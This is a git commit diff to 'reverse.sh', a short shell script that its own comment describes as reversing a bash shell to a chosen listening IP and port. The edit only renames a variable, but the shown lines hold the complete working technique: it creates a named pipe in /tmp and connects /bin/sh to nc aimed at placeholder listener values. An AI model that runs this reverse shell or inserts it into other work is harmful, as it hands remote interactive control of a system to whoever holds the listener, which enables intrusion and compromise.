4e46b7629153d072451d9f7866a7ea06233d4b18
avfisher <brianwangrewa@gmail.com>
2016-03-04 14:35:17 +0800

    Update reverse.sh

--- reverse.sh
+++ reverse.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 # This is a Linux shell script to reverse bash shell to a specific listenning IP and port. 
 
-a=$(date +%s);
-backpipe="backpipe""$a";
+random=$(date +%s);
+backpipe="backpipe""$random";
 
 mknod /tmp/$backpipe p;
 /bin/sh 0</tmp/$backpipe | nc [Listen IP] [Listen Port] 1>/tmp/$backpipe;
